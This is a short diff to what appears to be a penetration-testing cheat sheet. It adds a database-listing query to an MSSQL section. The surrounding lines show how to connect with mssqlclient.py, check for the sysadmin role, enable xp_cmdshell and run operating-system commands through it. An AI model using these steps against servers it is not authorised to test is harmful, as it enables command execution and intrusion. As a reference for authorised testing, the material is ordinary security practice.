@@ -283,6 +283,7 @@ $ openssl s_client -connect <IP address>:pop3s
 
 ```
 $ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
+SQL> SELECT name from sys.databases
 SQL> SELECT is_srvrolemember('sysadmin');
 SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 SQL> EXEC xp_cmdshell "whoami";
